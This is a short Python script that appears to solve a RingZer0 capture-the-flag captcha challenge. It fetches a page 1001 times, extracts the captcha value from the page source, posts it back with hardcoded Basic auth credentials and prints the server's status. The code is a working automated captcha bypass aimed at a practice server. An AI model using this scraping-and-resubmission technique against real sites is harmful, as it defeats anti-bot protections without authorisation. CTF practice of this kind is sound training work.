#!/usr/bin/env python

import sys
import requests
import re
import lxml.html

s = requests.session() # permits a persistent session
for i in range(1,1002): # Need to send 1001 requests to get the flag ;)
    headers = {'Authorization':'Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='}; 

    r = s.get('http://captcha.ringzer0team.com:7421/form1.php', headers=headers);  # get captcha from this request

    for line in r.iter_lines():  # this carves out the captcha from the initial request
        if "if (A ==" in line:
            captcha_val = line.split("\"")[1]

    cookie = {'_ga':'GA1.2.44395782.1481118206'} 

    s.get('http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new', headers=headers)  #Need to make this request, or it wont work.
    final_response = s.post('http://captcha.ringzer0team.com:7421/captcha1.php', data= {'captcha':captcha_val}, cookies=cookie, headers=headers); #sends the captcha to the webserver

    doc = lxml.html.document_fromstring(final_response.text)  # this and the next three lines carves out the message that gives us our status
    alert = doc.xpath('//div[contains(@class, "alert")]')[0]
    msg = alert.text_content().strip()
    print msg  #print the status seen in the XML response